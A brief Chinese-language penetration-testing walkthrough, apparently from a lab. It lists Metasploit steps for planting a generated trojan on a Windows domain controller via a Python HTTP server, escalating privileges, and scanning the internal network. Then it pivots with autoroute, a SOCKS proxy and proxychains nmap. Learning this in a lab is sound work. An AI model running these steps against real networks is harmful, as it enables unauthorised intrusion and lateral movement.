pivoting跳板攻击和自动路由

  1. 使用msf生成木马

  2. 使用python开启文件服务器 python2 -m SimpleHTTPServer 8080

  3. 在win2012-dc服务器上下载msf生成的木马

  4. 上线

  5. 进行提权

  6. 连接上查看ipconfig 发现两个ip 认为是有域服务

  7. 使用run post/windows/gather/arp_scanner RHOSTS=192.168.138.0/24扫描内网信息

  8. run post/multi/manage/autoroute 使用自动路由 run autoroute -p

  9. 放入后台backgroud

  10. 使用socket代理 use auxiliary/server/socks_proxy

  11. show options

  12. 设置为自己的10044端口接收socke协议，可以嫁接到自动路由上

  13. 运行run

  14. jobs发现运行了

  15. nano /etc/proxychains4.conf 进入socket配置文件加入

  16. 保存退出 nano：使用快捷Ctrl+X，然后会提示输入Y保存修改、输入N放弃修改。vi：首先需要按ESC键回到命令模式；然后输入:wq 保存文件并退出vi；最后回车即可。

  17. 怎么证明进入它的内网打开火狐 proxychains firefox 输入域中的网站

  18. 使用nmap扫描常用端口 proxychains nmap -sT -Pn 192.168.138.130 开启了 445端口
